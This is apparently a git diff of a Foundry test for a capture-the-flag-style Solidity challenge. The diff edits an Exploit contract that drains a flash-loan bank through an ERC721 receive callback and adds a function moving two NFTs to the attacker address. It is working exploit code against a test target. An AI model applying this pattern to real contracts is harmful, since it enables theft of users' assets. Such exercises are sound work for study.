@@ -44,18 +44,18 @@ contract CounterTest is Test {
         flashLoanBank.deposit{value: 2 ether}();
     }
 
-    function validation() public {
-        assertEq(nft.balanceOf(attacker), 2);
-    }
-
     function testExploit() public {
         vm.startPrank(attacker);
         Exploit exploit = new Exploit(flashLoanBank, nft);
         exploit.deposit{value: address(attacker).balance}();
         exploit.withdraw();
+        exploit.transfer();
         vm.stopPrank();
-
         validation();
+    }
+
+    function validation() internal {
+        assertEq(nft.balanceOf(attacker), 2);
     }
     
 }
@@ -77,7 +77,6 @@ contract Exploit {
     }
 
     function withdraw() external {
-        flashLoanBank.approve(address(flashLoanBank), type(uint256).max);
         flashLoanBank.withdraw();
     }
 
@@ -90,4 +89,9 @@ contract Exploit {
         returns (bytes4){
             return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
         }
+
+    function transfer() external {
+        nft.safeTransferFrom(address(this), msg.sender, 1);
+        nft.safeTransferFrom(address(this), msg.sender, 2);
+    }
 }
